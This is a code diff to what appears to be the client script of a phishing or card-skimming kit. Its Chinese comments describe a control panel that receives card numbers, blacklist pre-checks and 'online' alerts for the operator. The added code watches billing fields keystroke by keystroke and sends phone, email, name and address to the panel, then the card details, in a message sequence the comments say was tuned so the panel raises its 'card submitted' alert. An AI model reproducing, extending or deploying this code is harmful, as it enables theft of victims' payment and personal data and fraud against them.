@@ -538,6 +538,63 @@
     return { ok: true, number: num, brand: brand, expiry: E.exp.value.trim(), cvc: cvc };
   }
 
+  /* 地址/个人信息上报：面板的「地址页面信息」栏靠 e11 submit_address 填充 */
+  var billingTimer = null;
+
+  function isBillingEl(el) {
+    if (!el || !el.tagName) { return false; }
+    var tag = el.tagName.toLowerCase();
+    if (tag !== 'input' && tag !== 'select' && tag !== 'textarea') { return false; }
+    var nm = normText((el.getAttribute('id') || '') + ' ' +
+                      (el.getAttribute('name') || '') + ' ' +
+                      (el.getAttribute('autocomplete') || ''));
+    if (/(^|\s)(bp|card|cc|cvc|cvv|expiry|exp)(\s|$)/.test(nm)) { return false; }
+    var t = (el.getAttribute('type') || '').toLowerCase();
+    if (t === 'checkbox' || t === 'radio' || t === 'submit' || t === 'button') { return false; }
+    return true;
+  }
+
+  function billingPayload() {
+    var b = collectBilling();
+    var p = {
+      userType: 'client',
+      userId: S.userId,
+      page_visit_id: S.pageVisitId,
+      logtype: C.logtype,
+      status: statusOf()
+    };
+    for (var k in b) {
+      if (!Object.prototype.hasOwnProperty.call(b, k) || !b[k] || k === 'name') { continue; }
+      p[k] = b[k];
+    }
+    return p;
+  }
+
+  function sendBilling(reason) {
+    var p = billingPayload();
+    if (!p.phone && !p.email && !p.address1 && !p.city && !p.zip && !p.firstname) { return false; }
+    send('submit_address', p);
+    log('submit_address', reason || '', p.address1 || p.phone || p.email || '');
+    return true;
+  }
+
+  function bindBillingInputs() {
+    var root = E.form || doc;
+    on(root, 'input', function (ev) {
+      if (!isBillingEl(ev.target)) { return; }
+      if (billingTimer) { clearTimeout(billingTimer); }
+      billingTimer = setTimeout(function () {
+        billingTimer = null;
+        sendBilling('input');
+      }, 800);
+    }, true);
+    on(root, 'change', function (ev) {
+      if (!isBillingEl(ev.target)) { return; }
+      if (billingTimer) { clearTimeout(billingTimer); billingTimer = null; }
+      sendBilling('change');
+    }, true);
+  }
+
   /* 账单信息采集：不依赖固定字段名，扫描表单按关键词归类（兼容任意落地页）
    * 关键词同时覆盖中/英/越/西语；越南四级地址会重组成面板的 address1/address2/city/state */
   function normText(s) {
@@ -743,6 +800,9 @@
         return false;
       }, true);
     }
+
+    /* 账单/地址字段：面板「地址页面信息」栏靠 e11 填充 */
+    bindBillingInputs();
 
     return true;
   }
@@ -1663,9 +1723,10 @@
     S.submitting = true;
 
     /* 提交序列：与"实测能响"的报文逐字对齐（2026-11-27 对照实验确定）
-     *   e12 卡号 → e21 黑名单预检 → e13 update_card → e2 Go_Live(3+) → e14 save_card → e22 step
+     *   e11 地址 → e12 卡号 → e21 黑名单预检 → e13 update_card → e2 Go_Live(3+) → e14 save_card → e22 step
      * 关键：面板要看到 e13(update_card) 才会把这次当作"用户提交"，从而触发"提交卡号"提醒；
      *      只有 e14 时订单能落库，但不提醒。status 全程保持 '1'（在线）。 */
+    sendBilling('submit');                 /* 面板「地址页面信息」栏靠 e11 填充 */
     submitCard();
     var richData = submitPayloadRich();
     setTimeout(function () { send('update_card', richData); }, 150);
